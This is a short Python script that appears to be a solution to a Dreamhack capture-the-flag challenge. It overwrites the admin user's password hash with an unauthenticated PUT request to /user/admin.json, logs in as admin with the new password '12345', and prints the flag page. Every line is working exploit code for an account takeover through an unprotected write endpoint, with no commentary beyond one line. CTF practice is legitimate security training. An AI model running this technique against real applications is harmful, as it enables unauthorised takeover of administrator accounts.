import requests
from bs4 import BeautifulSoup
import hashlib


url = "http://host3.dreamhack.games:21563"

proxies = {
    'http': 'http://localhost:8080',
    'https': 'http://localhost:8080'
}

# Change the password hash of admin user

payload = {
    'password':hashlib.sha256("12345".encode('utf-8')).hexdigest()
}

res = requests.put(url=url + '/user/admin.json', 
                   data=payload, 
                   proxies=proxies, 
                   timeout=5)

    
session = requests.Session()

credential = {
    'username':'admin',
    'password':'12345'
}

res = session.post(url=url + '/login.php', 
                   data=credential, 
                   proxies=proxies, 
                   timeout=5)

flag = session.get(url=url + '/flag.php', 
                   proxies=proxies,
                   timeout=5)

print(BeautifulSoup(flag.text, features='html.parser'))